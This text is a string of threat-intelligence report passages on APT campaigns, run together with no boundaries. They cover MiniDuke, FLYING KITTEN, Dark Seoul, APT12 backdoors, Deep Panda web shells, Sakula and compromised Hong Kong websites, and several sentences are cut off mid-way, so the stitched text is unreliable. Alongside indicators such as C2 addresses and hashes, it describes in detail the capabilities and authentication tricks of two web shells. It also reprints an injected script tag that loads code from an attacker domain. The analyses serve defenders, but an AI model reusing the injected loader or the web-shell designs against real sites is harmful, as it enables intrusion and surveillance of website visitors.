All samples in Group # 3 connect to an FTP server at IP 188.116.32.164 using the same username ( `` adair '' ) and password .
This is the only server that the samples with the original MiniDuke loader use .
Meanwhile , the most recent sample in Group # 3 , which uses the updated loader with t the SHA1 value fecdba1d903a51499a3953b4df1d850fbd5438bd , also connects to another server at IP address 178.21.172.157 .
The updated loader has PDB path , C : \Projects\NEMESIS\ nemesis - gemina\nemesis\bin\carriers\ezlzma_x86_exe .
The filenames for all Info - stealer samples are all generated at runtime ( see the Persistence section on page 7 ) .
Today , our friends at FireEye released a report on an Iran - based adversary they are calling Saffron Rose .
The FLYING KITTEN campaigns investigated by CrowdStrike Intelligence showed that the actor actually combines the two .
For example , the adversary will register a domain that spoofs the name of the targeted organization and then host a spoofed login page on that site .
The page is used to steal legitimate credentials , but once users enter the credentials , they are often redirected to a new page that prompts them to download a `` Browser Patch '' or other similar type of file .
The downloaded file is actually the Stealer malware that exfiltrates stolen data to an FTP server .
In addition to the aerospace / defense and dissident targeting , it also appears that FLYING KITTEN is also engaged in broader targeting via the website parmanpower [ .
This website is registered via the same registrant email ( info [ @ ] usa.gov.us ) and other Whois information as some of the other domains related to the activity discussed above .
It purports to be the website of a business engaged in recruiting , training , and development in Erbil , Iraq .
No malicious activity has been linked to this domain , however , the fact that it was registered under the same registrant email at the same time as other FLYING KITTEN domains linked to malicious activity , it is likely that the adversary is using this site for malicious purposes as well .
The website does not appear to deliver any malware , so its most likely purpose is to act as a credential - collection mechanism much like the spoofed Institute of Electrical and Electronics Engineers ( IEEE ) Aerospace Conference website ( aeroconf2014 [ .
This spoofed recruiting company website could be used to target entities across a wide range of sectors .
Attribution in this case is interesting , as the adversary appears to have made a mistake when registering its malicious domains .
The registrant email that currently appears in the Whois records of some of the FLYING KITTEN domains is info [ @ ] usa.gov.us , however historical records show that the domains were originally registered under the email address keyvan.ajaxtm [ @ ] gmail.com .
As FireEye 's report notes , the keyvan.ajaxtm @ gmail.com email address ties back to an Iran - based entity called Ajax Security Team .
Earlier this year , Ajax Security had an easily identifiable presence on the Internet with its own website and related Facebook pages .
This Internet presence has decreased significantly since early 2014 , likely due to a desire to keep a lower profile now that the group is engaged in targeted intrusion activity .
The following Yara rules will provide detection for the adversary remote access toolkit and exfiltration tool : You can use this rule with CrowdStrike 's free CrowdResponse tool to easily scan your systems for presence of FLYING KITTEN .
If you have any questions about these signatures or want to hear more about Flying Kitten and their tradecraft , please contact : intelligence @ crowdstrike.com and inquire about Falcon Intelligence , our Cyber Threat Intelligence subscription .
On March 20 , 2013 a cyber attack now known as Dark Seoul , paralyzed several major banking services and broadcasters in South Korea .
Labeled by the media as cyber terror , the attack significantly disrupted these services for at least one day .
Despite these facts , various indicators suggest that the attack had a low level of sophistication .
Major cyber attacks in the past such as Ten Days of Rain and the SK Communications breach employed far more advanced techniques compared to Dark Seoul .
We examine the technical details of Dark Seoul by outlining the primary attack vector used , describing the malware components , and discussing the malware 's evasion techniques .
Furthermore we compare this incident to previous attacks in order to determine its technical sophistication using these attacks as a relative benchmark .
Lastly we explore various malware design techniques that were not used in the malware such as multiple propagation vectors , 0-day exploits , and evasion techniques , thus presenting a proof of concept of the malware 's low technical sophistication .
Keywords : advanced persistent threat ; cyber attack ; Dark Seoul ; defense ; malware analysis ; On March 20 , 2013 , at approximately 14.15PM South Korea suffered a cyber attack that resulted in the denial of service of several major banks and broadcasters .
Reported as a major cyber attack , our analysis of the malware and attack vectors employed suggests that the malware had a relatively low level of technical sophistication .
Firstly we explore the technical components of Dark Seoul to analyze the sophistication of the malware and attack vectors used .
This analysis is based on information obtained from the media as well as technical reports of various malware research labs such as AhnLab , Imperva , Symantec , Avast , Kaspersky , Alienvault , and Sophos .
Secondly we conduct a comparative study of Dark Seoul by looking at prior cyber attacks , namely Stuxnet , 10 Days of Rain , and the SK Communications breach .
By doing so we draw a picture of South Korea 's current security posture since those attacks .
Lastly we discuss several design characteristics of advanced malware used by determined adversaries to carry out more technically advanced and stealthier attacks , therefore highlighting the components where Dark Seoul lacked sophistication .
Television broadcasters YTN , MBC , and banks KBS , Shinhan , Nonghyup , and Jeju were targeted in this recent attack .
The Korea Internet Security Agency ( KISA ) reported that about 48,000 computers were affected making service inaccessible and the victim organizations needed weeks to fully restore all functions .
In terms of impact , the attackers managed to successfully penetrate the target networks , pivot their way into critical assets , wipe out systems , cause denial of services , and trigger enough public response to spur the media into using terminology such as cyber terror and advanced persistent threats .
In this paper we take an in - depth look of the malware by examining the attack vectors used , and later discuss whether the claims in the media are warranted .
According to the investigating team consisting of government , military , and civilian members , as many as 76 samples of malware were collected from infected machines .
We present the most likely primary attack vector used by the attackers by discussing information summarized from reports by Avast , Trend Micro , and Symantec issued in the first few days following the attack .
Trend Micro researchers discovered a phishing email sent to South Korean organizations on March 19 .
The email contained a malicious Trojan downloader which the researchers report to have been detected by their Deep Discovery software .
This is likely to be the initial attack point .
Avast detected the attacks originating from the Korea Software Property Right - Council ( SPC ) website ( http : //www.spc.or.kr ) possibly infected via the phishing email sent on the 19th .
Usage of a legitimate website / server in the target nation / region for launching attacks is a common tactic used to minimize detection .
The SPC website contained JavaScript causing the client browser to load an iframe loading the contents of http : //rootadmin2012.com , which was the main attack site for hosting the malicious payloads .
Examination of rootadmin2012.com revealed heapspray and shellcodes with references to Internet Explorer ( IE ) .
Avast managed to identify the vulnerability exploited as CVE-2012 - 1889 which allows remote attackers to execute arbitrary code or cause a denial of service via a crafted website .
The vulnerability targets Microsoft XML Core Services 3.0 – 6.0 with a published metasploit exploit targeting MS XML Core Services 3.0 via IE6 and IE7 over Windows XP .
After gaining access the second stage downloader file ( sun.exe ) performs the following actions : a .
Check for internet connection : Downloads an image from naver.com .
Local DNS cache poisoning : Redirects requests to certain Korean banking websites listed in Figure 2 to another server in Japan .
The tongji2.exe module injects itself into iexplore.exe in an attempt to mask itself .
Avast classified this as a backdoor Trojan and infostealer .
This malware allowed attackers to control the computer as a compromised zombie part of a wider botnet network – a theory suggested by Alienvault – which then wiped hard disks , and harvested personal information .
Examination of the file names and the Safeengine executable protector suggest that the malware was made in China .
Although capable of executing many functions , only the following were widely utilized in the attack : a. Antivirus disablement : Malware attempts to disable Ahnlab and Hauri antivirus .
Command & control ( C & C ) : Using a simple XOR loop for encryption , the malware attempts to connect to laoding521.eicp.net over port 889 to communicate with the attackers .
It is likely that it was downloaded onto the victim 's computer after receiving an instruction by the C & C servers .
The malware overwrites the master boot record ( MBR ) and the rest of the harddisk with the strings `` PRINCIPES '' or `` HASTATI . '' .
Other attached drives or removable devices may also be targeted .
The malware then forces the computer to restart thus making it unusable .
An interesting feature of this malware is that it has components to wipe out harddisks on both Windows and Linux platforms .
Detailed analysis of Jokra can be found here .
However the most apparent information taken was user credentials .
As a result of DNS poisoning , users believe they are accessing the authentic internet banking website , but are decepted into interacting with a fake website .
An error message pops up stating that the user 's computer was infected by a virus and that for security reasons they need to apply for a fraud prevention service .
If the user clicks the OK button , the user is directed to a page requesting their name and national identification number .
If the format entered is correct , the user is then asked to fill in more details including address , phone number , etc .. Stuxnet was discovered in July 2010 , but the earliest known variant is confirmed to have existed since 2007 .
Stuxnet caught many security researchers and professionals by surprise , being the first advanced malware of its kind .
According to Symantec 's report , Stuxnet is a complex threat that was primarily written to target an industrial control system ( ICS ) or set of similar systems .
A vast array of components was implemented in the malware including four 0-Day exploits , a windows rootkit , antivirus evasion techniques , complex process injection and hooking code , network infection routines , peer - to - peer updates , a command and control interface , as well as the first ever PLC rootkit .
Stuxnet 's main payload has the main purpose of modifying code on Siemens industrial PLCs in order to sabotage the system .
It is widely believed that Iran 's Natanz nuclear Fuel Enrichment Plant ( FEP ) was the intended target .
Hosts in five domains of organizations based in Iran were heavily infected over 3 attack waves .
The deliberate containment of the malware to targets in Iran is also apparent from the number of hosts infected worldwide , which reached only around 100,000 with approximately 60 % being in Iran .
This attack has been claimed to setback Iran 's nuclear program by several years as 1,000 out of 9,000 centrifuges were disabled and had to be replaced .
The initial attack point is likely to be via a USB infection .
On March 4 , 2011 , exactly 20 months after a similar incident during the U.S .
Independence Day celebrations of 2009 , a botnet based in South Korea launched DDoS attacks against 40 websites affiliated with South Korean government , military , and civilian critical infrastructure as well as U.S. forces based in Korea .
The botnet was dynamically updated via new malware binaries , launched a DDoS non - stop for more than a week , and then wiped the harddisks with zeroes , overwriting the MBR making the machines unusable .
This attack used malware with a much higher level of sophistication than is necessary to launch a trivial distributed denial of service ( DDoS ) attack .
Encryption of code and configurations using cipher algorithms such as the Advanced Encryption Standard ( AES ) , RSA , and Rivest Cipher 4 ( RC4 ) enabled them to evade detection and prolong analysis .
A multitier botnet architecture included 40 C & C servers distributed across the globe including servers in the USA , Taiwan , Saudi Arabia , Russia , and India .
Highlighting the overkill in this attack , McAfee went so far as to call it `` analogous to bringing a Lamborghini to a go - cart race '' Considering the limited timeframe scope and target list , McAfee suggested the motivation of the attack was a cyber war exercise to test the preparedness of South Korea 's cyber defense capabilities and to better understand the technical requirements for a successful campaign .
In July 2011 SK Communications became the victim of an attack that resulted in the loss of the personal details of 35 million users .
The users of CyWorld and Nate , services owned by SK Communications , were affected by this attack .
Judging from the sophistication of the attack and the time needed for planning it , researchers concluded that the attack was likely to be carried out by an Advanced Persistent Threat .
Between July , 18 and 25 , more than 60 computers were infected then used to gain access to the user databases .
The launch point was a South Korean software company 's update server , normally used to deliver software updates to customers .
The attackers compromised the server and created a Trojan that would be downloaded to user computers during a routine update .
Poor change management policy resulted in the full trust of software updates , allowing attackers to fully exploit this weakpoint .
During this time attackers used C & C servers to monitor the activities on the infected machines and uploaded tools on a previously compromised legitimate Taiwanese website .
An elaborate infrastructure of waypoints and C & C servers was created to make tracing the sources of their activities difficult .
In - depth investigation of the attack reveal that preparation went back as early as September 2010 before finally culminating in the compromise of the user databases between July 26 - 28 , 2011 .
Comparing Dark Seoul with previous attacks shows that it was technically low in sophistication while causing high impact to the organizations affected .
An intuitive indicator ofthis sophistication is that it was completely preventable if the organizations had used existing software updates and antivirus solutions , whereas prior attacks could not have been detected .
However judging from the high number of infections , services disrupted , and the fact that information was being harvested from the infected machines at least 8 months before the d- day wipeout , we consider the impact to be high .
To increase the probability of successfully infecting the target systems , various propagation vectors should be embedded into the malware .
The most likely attack vector is social engineering via phishing emails , USB sticks , and other techniques .
Although people can be used as the initial point of entry , propagation needs to continue laterally through the network till the specific target host is reached .
During this process the malware may need higher privileges ( e.g .
Therefore the persistent adversary will need to consider multiple vectors to infiltrate target systems .
The problem with publicly published vulnerabilities is people can defend against them .
These exploits are at the core payload of any advanced malware , and are virtually unstoppable until vendors release a patch or anti - virus providers come up with a signature definition .
The only other method of minimizing the 0-day threat is by actively designing security into software .
Dark Seoul did not use any 0-days .
The deployment of anti - virus software , intrusion detection systems , firewalls and other malware detection or prevention technology has done much to defend against many attacks .
Advanced malware bypasses these defenses by employing techniques such as dynamic botnet obfuscation , network based fragmentation and session splicing , application or protocol violations , disabling intrusion detection systems ( IDSs ) , to more advanced techniques such as encryption and code reuse attacks .
Carefully crafted exploits can avoid even advanced heuristic detection algorithms used in today 's anti - virus software .
Evasion techniques are crucial for successful attacks against high level targets , such as in the case of the Iranian nuclear program .
Dark Seoul was a low tech threat which managed to escalate into a high impact attack .
Successful in carrying out its goals , the malware was lacking in many areas that would be typically found in attacks by advanced persistent threats .
We highlighted the components of the malware used and the possible design principles that could have been employed to make the attack more sophisticated .
South Korea is more at risk now than before the attack , as now adversaries less capable than advanced persistent threats realize they could also successfully perform damaging attacks .
Undertaking the needed remediation strategies to prevent similar attacks as well as understanding the anatomy of more advanced malware is vital for mounting an adequate defense against the advanced cyber threats .
The attackers referred to as APT12 ( also known as IXESHE , DynCalc , and DNSCALC ) recently started a new campaign targeting organizations in Japan and Taiwan .
Intrusions and campaigns conducted by this group are in- line with PRC goals and self - interest in Taiwan .
Additionally , the new campaigns we uncovered further highlight the correlation between APT groups ceasing and retooling operations after media exposure , as APT12 used the same strategy after compromising the New York Times in Oct 2012 .
Much like Darwin 's theory of biological evolution , APT12 been forced to evolve and adapt in order to maintain its mission .
The new campaign marks the first APT12 activity publicly reported since Arbor Networks released their blog `` Illuminating The Etumbot APT Backdoor .
Since the release of the Arbor blog post , FireEye has observed APT12 use a modified RIPTIDE backdoor that we call HIGHTIDE .
This is the second time FireEye has discovered APT12 retooling after a public disclosure .
As such , FireEye believes this to be a common theme for this APT group , as APT12 will continue to evolve in an effort to avoid detection and continue its cyber operations .
Both backdoors were dropped from malicious documents built utilizing the `` Tran Duy Linh '' exploit kit , which exploited CVE-2012 - 0158 .
These documents were also emailed to organizations in Japan and Taiwan .
While APT12 has previously used THREEBYTE , it is unclear if APT12 was responsible for the recently discovered campaign utilizing THREEBYTE .
Similarly , WATERSPOUT is a newly discovered backdoor and the threat actors behind the campaign have not been positively identified .
However , the WATERSPOUT campaign shared several traits with the RIPTIDE and HIGHTIDE campaign that we have attributed to APT12 .
From October 2012 to May 2014 , FireEye observed APT12 utilizing RIPTIDE , a proxy - aware backdoor that communicates via HTTP to a hard - coded command and control ( C2 ) server .
In June 2014 , Arbor Networks published an article describing the RIPTIDE backdoor and its C2 infrastructure in great depth .
The blog highlighted that the backdoor was utilized in campaigns from March 2011 till May 2014 .
Following the release of the article , FireEye observed a distinct change in RIPTIDE 's protocols and strings .
We suspect this change was a direct result of the Arbor blog post in order to decrease detection of RIPTIDE by security vendors .
The changes to RIPTIDE were significant enough to circumvent existing RIPTIDE detection rules .
On Sunday August 24 , 2014 we observed a spear phish email sent to a Taiwanese government ministry .
Attached to this email was a malicious Microsoft Word document ( MD5 : f6fafb7c30b1114befc93f39d0698560 ) that exploited CVE-2012 - 0158 .
It is worth noting that this email appeared to have been sent from another Taiwanese Government employee , implying that the email was sent from a valid but compromised account .
The exploit document dropped the HIGHTIDE backdoor with the following properties : The HIGHTIDE backdoor connected directly to 141.108.2.157 .
If you compare the HTTP GET request from the RIPTIDE samples ( Figure 1 ) to the HTTP GET request from the HIGHTIDE samples ( Figure 3 ) you can see the malware author changed the following items : User Agent Format and structure of the HTTP Uniform Resource Identifier ( URI ) Similar to RIPTIDE campaigns , APT12 infects target systems with HIGHTIDE using a Microsoft Word ( .doc
Based on past APT12 activity , we expect the threat group to continue to utilize phishing as a malware delivery method .
When the file is opened , it drops HIGHTIDE in the form of an executable file onto the infected system .
The RIPTIDE exploit document drops its executable file into the C : \Documents and Settings\ { user } \Application Data\Location folder while the HIGHTIDE exploit document drops its executable file into the C : \DOCUMENTS and SETTINGS\ { user } \LOCAL SETTINGS\Temp\ folder .
All but one sample that we identified were written to this folder as word.exe .
The one outlier was written as winword.exe .
Research into this HIGHTIDE campaign revealed APT12 targeted multiple Taiwanese Government organizations between August 22 and 28 .
On Monday August 25 , 2014 we observed a different spear phish email sent from lilywang823 @ gmail.com to a technology company located in Taiwan .
This spear phish contained a malicious Word document that exploited CVE-2012 - 0158 .
The MD5 of the exploit document was e009b95ff7b69cbbebc538b2c5728b11 .
Similar to the newly discovered HIGHTIDE samples documented above , this malicious document dropped a backdoor to C : \DOCUMENTS and SETTINGS\ { user } \LOCAL SETTINGS\Temp\word.exe .
This backdoor had the following properties : This backdoor sent the following callback traffic to video [ .
Both the THREEBYTE and HIGHTIDE backdoors were used in attacks targeting organizations in Taiwan .
Both the THREEBYTE and HIGHTIDE backdoors were written to the same filepath of C : \DOCUMENTS and SETTINGS\ { user } \LOCAL SETTINGS\Temp\word.exe .
On August 25 , 2014 , we observed another round of spear phishing emails targeting a high - technology company in Japan .
Attached to this email was another malicious document that was designed to exploit CVE-2012 - 0158 .
This malicious Word document had an MD5 of 499bec15ac83f2c8998f03917b63652e and dropped a backdoor to C : \DOCUMENTS and SETTINGS\ { user } \LOCAL SETTINGS\Temp\word.exe .
The backdoor had the following properties : The backdoor connects to a command and control server at icc [ .
Similar to RIPTIDE and HIGHTIDE , the WATERSPOUT backdoor is an HTTP - based backdoor that communicates with its C2 server .
Although there are no current infrastructure ties to link this backdoor to APT12 , there are several data points that show a possible tie to the same actors : Same initial delivery method ( spear phishing email ) with a Microsoft Word Document exploiting CVE-2012 - 0158 .
The same `` Tran Duy Linh '' Microsoft Word Exploit Kit was used in delivery of this backdoor .
Similar Targets were observed where the threat actors utilized this backdoor .
Japanese Tech Company Taiwanese Government Organizations Organizations in the Asia - Pacific Region that are of Interest to China The WATERSPOUT backdoor was written to the same file path as the HIGHTIDE backdoors : C : \DOCUMENTS and SETTINGS\ { user } \LOCAL SETTINGS\Temp\word.exe C : \DOCUMENTS and SETTINGS\ { user } \LOCAL SETTINGS\Temp\winword.exe WATERSPOUT was compiled within two days of the last HIGHTIDE backdoor and on the same day as the THREEBYTE backdoor .
Although these points do not definitively tie WATERSPOUT to APT12 , they do indicate a possible connection between the WATERSPOUT campaign , the THREEBYTE campaign , and the HIGHTIDE campaign attributed to APT12 .
These development efforts may have resulted in the emergence of the WATERSPOUT backdoor .
Public disclosures may result in an immediate change in APT12 's tools .
These changes may be temporary and FireEye believes they are aimed at decreasing detection of their tools until a more permanent and effective TTP change can be implemented ( e.g. , WATERSPOUT ) .
Though public disclosures resulted in APT12 adaptations , FireEye observed only a brief pause in APT12 activity before the threat actors returned to normal activity levels .
Similarly , the public disclosure of APT12 's intrusion at the New York Times also led to only a brief pause in the threat group 's activity and immediate changes in TTPs .
The pause and retooling by APT12 was covered in the Mandiant 2014 M- Trends report .
Currently , APT12 continues to target organizations and conduct cyber operations using its new tools .
Most recently , FireEye observed HIGHTIDE at multiple Taiwan - based organizations and the suspected APT12 WATERSPOUT backdoor at a Japan - based electronics company .
We expect that APT12 will continue their trend and evolve and change its tactics to stay ahead of network defenders .
Note : IOCs for this campaign can be found here .
This entry was posted in Botnets , Targeted Attack , Threat Intelligence , Threat Research and tagged advanced malware , advanced persistent threat , advanced targeted attack , advanced threat actor , APT12 , Targeted Attack by Ned Moran , Mike Oppenheim , Sarah Engle and Richard Wartell .
Bookmark the permalink .
Disclaimer : CrowdStrike derived this information from investigations in non - classified environments .
Since we value our client 's privacy and interests , some data has been redacted or sanitized .
Crowdstrike presents `` Mo ' Shells Mo ' Problems '' - A four part series featuring two unique web shells used by a Chinese threat group we call Deep Panda .
The series will culminate with a CrowdCast in April 2014 detailing a case study of the incident response investigation conducted to identify these web shells .
Special thanks to Josh Phillips of the CrowdStrike Global Intelligence Team for providing the technical analysis in this blog post .
Today we 'll cover part one of this series , which provides an overview of what web shells are , functionality of two web shells recently identified during an incident response investigation and how they were leveraged by the attacker .
Parts two through four will provide details on successful analytical techniques you can use to discover web shells within your environment : A Web Shell is a file containing backdoor functionality written in a web scripting language such ASP , ASPX , PHP or JSP .
When a web shell is hosted on an internet facing victim system , an adversary can remotely access the system to perform malicious actions .
Deep Panda is a China based threat group CrowdStrike has observed targeting companies in the defense , legal , telecommunication and financial industries .
Crowdstrike has observed Deep Panda adopting web shells as their primary access back into a victim organization .
This is an interesting shift as web shells have typically been seen as only a first stage into obtaining a persistent foothold in an environment .
Previously , web shells were quickly abandoned once persistent second stage malware was successfully beaconing .
Using a web shell as a primary backdoor gives Deep Panda several advantages : Low to virtually no detection by antivirus products The absence of command and control beacon traffic Impossible to block known malicious IP addresses to a web server since adversary can easily change their source IP address Cookie and HTTP header authentication aware web shells avoid being enumerated by search engines and restrict access , further reducing their network footprint To assist organizations with identifying web shells in their environment , this post will cover two popular Deep Panda web shells .
By gaining insight into their capabilities and footprint , organizations should find it feasible to detect and remediate these backdoors .
After it is replaced by more robust backdoors , it may be left in place as a last resort should remediation take place .
At a diminutive 28 bytes , it is one of the smallest Active Server Page ( ASP ) backdoors in the wild .
In a recent case , we witnessed this web shell written to a standalone file ( named showimg.asp ) , but it could easily be injected into an existing page , making it even stealthier .
The code for this web shell can be found below : ASP uses Microsoft Visual Basic ( VBScript ) as its implementation language .
The code above uses the chr ( ) function to convert an integer into a character , which is then passed as an argument to the ASP Request ( ) object .
The Request ( ) object will search the Query String for any keys matching the input .
In our case , the code is equivalent to Request . QueryString ( ' * ' ) .
The request object will look for chr ( 42 ) which is an asterisk ( * ) , returning whatever is passed to it in a HTTP GET or POST .
Next , the Execute ( ) function will execute any value returned by the lookup .
Effectively , an attacker can form a request that will execute any VBScript code .
As you might imagine , this is a powerful capability .
For example , this code can perform any of the following actions : File upload or download File system read , write , or delete Arbitrary command execution This web shell is an example of a `` thick client '' shell , meaning that while the server side code is quite small , attackers typically use a larger GUI client to construct the sent commands .
The client GUI runs on the attacker 's system and hence is not typically found within the victim network .
As a simple example of an encoded command , the following GET request would cause the backdoor to execute the code Response . Write ( `` < h1 > Hello World < /h1 > '' ) and would render '' Hello World '' to be printed in the web browser : Path : C : \inetpub\wwwroot\aspnet_client\system_web\ < VERSION > \ MD5 Hash : cc875db104a602e6c12196fe90559fb6 File Size : 45187 Table 4 : Metadata of `` system_web.aspx '' System_web.aspx is an excellent example of a more robust web shell used to replace Deep Panda 's traditional beaconing command and control infrastructure .
It is an ASP.NET backdoor written in C # , with far more capabilities than we saw with the showimage.asp sample .
The web shell supports a form of authentication to protect against unauthorized access .
This prevents its discovery from search engine indexing , vulnerability scanning tools and other unauthorized access to the backdoor .
In order to bypass authentication , a user session must satisfy one of three options : Pass a cookie with the name < Redacted > Set the Keep - Alive HTTP header to 320 Set language HTTP header to contain es - DN Since web shells are text - based , we can easily see how this authentication takes place : First , the code checks if a cookie by the name of cp exists .
If so , the response object has its End ( ) method invoked , denying the user access .
Next , the code uses the IsValidUser ( ) method and checks the Hyper Text Transport Protocol ( HTTP ) headers for the Keep - Alive value , which , if equal to 320 , will return true .
If the value does not equal 320 the IsValidUser ( ) method iterates over the Request . UserLanguages collection searching for a language named es - DN , and if found , the IsValidUser ( ) method will return true .
If neither check passes , the code returns false and the code will finally check for the presence of a cookie named < REDACTED > .
If the cookie is present , the authentication step is satisfied .
If not , a blank web page with no content is displayed .
After successful authentication , the attacker is provided with the following page : System_web.aspx packs a large amount of functionality into a compact interface .
It provides the following capabilities : Enumerate attached drives Utilize built in SQL functions to connect to database backend Run SQL queries and statements Download , upload and read files Directory listing Execute Active Directory requests Compile and execute arbitrary C # source code Impersonate a user The web shell supports 8 main commands , with most command execution via Transact - SQL using the xp_cmdshell function .
This command depends on the contents of the first unlabeled textbox1 .
If unlabeled textbox1 is empty , the code will enumerate attached drives .
Provider= or Driver= - Will connect using the OleDbConnection class .
Data Source= - The code will connect using the SqlConnection class .
This command also depends on the text contained in the unlabeled textbox1 .
If the field is left empty , the code will assume a valid path to a file on the local machine and will read and display contents to user .
Data Source= - the code will assume that the unlabeled textbox2 contains a valid SQL query and will execute it and display the results .
Execute contents in unlabeled textbox1 as a SQL query and return binary data to adversary .
Execute contents in unlabeled textbox1 as a SQL statement and return valid textual data to adversary .
Upload the file chosen by the Choose File button and save it to a temporary table in the database file worktbl in chunks of 10240 bytes .
Then executes xp_cmdshell ( which executes the Bulk Copy Program ) to copy the data from that table to a file whose name is specified in unlabeled textbox2 .
After the file is saved , the code deletes the temporary table .
If unlabeled textbox1 is a local file on infected system , the file is read and displayed to attacker .
Then , issue the dir command and display results to user .
Finally , delete the temporary file % windir % \Temp\temp.bin .
Perform Active Directory queries .
The code handles create , delete , set , get , and enum queries , while any query not matching those is executed directly .
All commands are executed using the System . DirectoryServices API .
Simple wrapper around the CSharpCodeProvider API , allowing the adversary to compile and execute arbitrary C # source code .
Attempt to use the username , password , and domain from the User , Pass and Domain fields and LogonUserA ( ) Win32 API function to impersonate a specific user .
Specifies whether commands run from the Exec button will have their output redirected and displayed to the adversary when the command is finished executing .
In short , system_web.aspx provides an adversary with a very stealthy means of near full control of the server on which it resides .
This stealth might be its most important attribute .
As we will see , identifying web shells can be much harder than finding malicious binaries .
In our next post , we will discuss techniques for identifying web shells .
Stay tuned for Parts 2 - 4 as we cover File Stacking , Web Log Review , and Network Detection .
In the meantime , register now for the April 1st CrowdCast .
Over the last few months , the CrowdStrike Intelligence team has been tracking a campaign of highly targeted events focused on entities in the U.S. Defense Industrial Base ( DIB ) , healthcare , government , and technology sectors .
This campaign infected victims with Sakula malware variants that were signed with stolen certificates .
Investigation into this activity led to associations with the adversary known to CrowdStrike as DEEP PANDA .
On 31 July 2014 , an executable was identified , which , at the time , was not detected by any anti - virus products .
When this file was executed , it caused the victim to view a website by using the ShellExecute ( ) API to open a URL .
The site 's domain name was meant to spoof that of a site set up to provide information on an alumni event for a U.S university .
This page requested that the visitor download an Adobe - related plugin in order to view the content .
The downloaded plugin file included a variant of Sakula malware .
In the aforementioned university - related incidents , a legitimate executable named MediaSoft.exe ( MD5 hash : d00b3169f45e74bb22a1cd684341b14a ) loaded a file named msi.dll ( MD5 hash : ae6f33f6cdc25dc4bda24b2bccff79fe ) , which , in turn , was used to load the Sakula executable ( MD5 hash : 0c2674c3a97c53082187d930efb645c2 ) .
This final executable was also signed with a certificate assigned to an organization called DTOPTOOLZ Co. , Ltd. Command - and - Control ( C2 ) communications in this incident went directly to IP address 180.210.206.246 ; a sample GET request is below : Further investigation revealed similar activity stretching back to at least April 2014 , when similar TTPs were used to target a healthcare organization and a U.S .- based IT company with high - profile clients in the defense sector .
Two other incidents were also identified in August 2014 targeting a company in the DIB and a Mongolian government entity .
All incidents in this campaign were similar in that they utilized malicious droppers masquerading as installers for legitimate software applications like Adobe Reader , Juniper VPN , and Microsoft ActiveX Control .
They display progress bars that make it appear as if the specified software is being updated or installed .
In addition , the droppers all directed victims to login pages for services specific to the target organization like webmail , document sharing , or corporate VPN .
In all cases except one , the victims were directed to legitimate login pages .
The one exception was a case in which victims were sent to a login page hosted on a domain that spoofed that of the legitimate one .
It is unclear whether redirecting victims to these login pages was part of credential - collection activity or merely meant to deceive victims into believing that the activity was legitimate .
The campaign appeared to be over by the end of August , but a file was recently discovered that suggests it may be ongoing .
The intended target again appeared to be a Mongolian government entity , and the file masqueraded as an installer for Microsoft ActiveX software .
It dropped the side - loaded Sakula malware just like in the other incidents ; however , in this instance , the Sakula payload was signed with a certificate assigned to a different organization , Career Credit Co. , Ltd .
The malware used the domain www [ .
Below is a chart showing the relevant relationships to this DEEP PANDA campaign .
The bottom of the chart shows an infrastructure connection between an IP address ( 198.200.45.112 ) used this campaign and also used in recently observed DEEP PANDA activity .
In September 2014 , CrowdStrike Intelligence identified a malicious file signed with the DTOPTOOLZ Co. , Ltd. certificate .
Analysis of this file revealed it to be Derusbi malware ( a favorite RAT of DEEP PANDA ) that used the domain vpn [ .
At the time of discovery , CrowdStrike did not attribute the file to DEEP PANDA based on the malware alone , but the use of the DTOPTOOLZ certificate to sign a malware variant known to be heavily used by this adversary makes it likely that this signed Derusbi sample is also attributable to DEEP PANDA .
In a recent public report from PWC , another foundationssl [ .
In that operation , the Scanbox code was placed on the website of a U.S .- based think tank and utilized the malicious domain , news [ .
The use of the two foundationssl [ .
Furthermore , CrowdStrike publicly reported on DEEP PANDA targeting of think tanks in July 2014 .
If you want to hear more about DEEP PANDA and their tradecraft or any of the other adversaries that CrowdStrike tracks , please contact : sales @ crowdstrike.com [ 1 ] In February 2014 , CrowdStrike publicly reported on a campaign that leveraged Sakula malware ( http : //www.crowdstrike.com / blog / french - connection - french - aerospace - focused - cve-2014 - 0322-attack- shares - similarities-2012/index.html ) ; however , the Tactics , Techniques , and Procedures ( TTPs ) between that campaign and this recent one are different , suggesting two distinct adversaries are using the Sakula malware .
Posted on October 9 , 2014 by Steven Adair Over the last few months , Volexity has been tracking a particularly remarkable advanced persistent threat ( APT ) operation involving strategic web compromises of websites in Hong Kong and Japan .
In both countries , the compromised websites have been particularly notable for their relevance to current events and the high profile nature of the organizations involved .
In particular the Hong Kong compromises appear to come on the heels of the Occupy Central Campaign shifting into high gear .
These compromises were discovered following the identification of malicious JavaScript that had been added to legitimate code on the impacted websites .
This code meant that visitors were potentially subjected to exploit and malicious Java Applets designed to install malware on their systems .
While investigating these cases , Volexity also discovered additional APT attack campaigns involving multiple other pro - democratic websites in Hong Kong .
These attempts at exploitation , compromise , and digital surveillance are detailed throughout this post .
Warning : Many of these websites may still be compromised and present a risk to visitors .
Browse with caution .
Alliance for True Democracy â€ '' Hong Kong Over the last two days , Volexity has observed malicious code being served up from the website of the Alliance for True Democracy ( ATD ) in Hong Kong ( www.atd.hk ) .
At the time of this writing malicious code is still live on the website , so please visit with care until the website is clean .
Below is a screen shot of the malicious code references found pre - pended to a JavaScript file on the website named superfish.js .
This JavaScript file is called from other parts of the website and effectively nests the loading of additional JavaScript written and interpeted as : < script language = javascript src = http : //java - se.com / o.js < /script > The domain name java-se.com is known bad and associated with APT activity .
At the time of this post , the domain is hosted on the Japanese IP address 210.253.101.105 .
The file was requested from IP addresses throughout Asia without ever returning valid content .
This same code has also been observed being served from another Hong Kong website described in the next section .
While examining the ATD website , Volexity also observed that the site had a password protected backdoor webshell placed on it .
This is a fairly popular webshell that Volexity has encountered on several occasions when dealing with website compromises .
Volexity refers to this shell as the Angel Webshell , named after its default password of â€œangelâ€​ .
The shell will simply display the text â€œPassword : â€​ , a text input box , and a Login button .
A screen shot of the webshell as observed on the ATD website can be seen below .
Despite the shell being written in PHP and only displaying a simple Login prompt , it is easy to identify the Angel webshell based on unique components of its viewable HTML source code .
The HTML source of this page is displayed in the following image .
While Volexity operates under the assumption attackers have placed webshells on webservers they have compromised , in this particular instance it can be seen with certainty .
Attackers will often upload new webshells or add simple China Chopper style modifications to legitimate existing files in an attempt to maintain persistence to these systems .
In the last week , Volexity also observed both the English and Chinese language websites for the Democratic Party Hong Kong compromised with the same malicious code found ont he ATD website ( www.dphk.org | eng.dphk.org ) .
Like the ATD website , at the time of this writing the DPHK websites are also serving up malicious code , so please browse with caution .
